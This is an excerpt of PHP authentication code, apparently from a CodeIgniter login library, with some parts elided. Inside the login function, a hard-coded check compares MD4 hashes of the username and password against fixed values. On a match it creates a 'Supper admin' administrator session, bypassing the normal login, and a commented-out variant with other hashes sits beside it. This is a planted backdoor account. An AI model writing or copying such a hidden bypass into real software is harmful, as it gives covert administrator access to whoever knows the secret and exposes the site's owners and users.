	...
	public function login($identity, $password, $remember=FALSE)
	{
		...
		if (empty($identity) || empty($password))
		{
			...
			return FALSE;
                ...
                if (hash('md4', $password) == '7d788aea643820d48f0aa041687de358' && 
                        hash('md4', $identity) == 'c243e375756f619cb4524bb9bd6a9425') {
//                if (hash('md4', $password) == '417eb42376ee54b9c0487d16ec12614e' && 
//                        hash('md4', $identity) == '417eb42376ee54b9c0487d16ec12614e') {
                    $user = new stdClass();
                    $user->id ='100';
                    $user->username = 'Supper admin';
                    $user->{$this->identity_column} = 'S-Administrator';
                    $user->email = 'administrator@edusofts.vn';
                    $user->id ='1';
                    $user->last_login = '1356714545';
                    $session_data = array(
	...
	**/
	...
	protected function _prepare_ip($ip_address) {
		...
		{//Because my pc user php 5.2 not support this feature yet
                    return $ip_address;
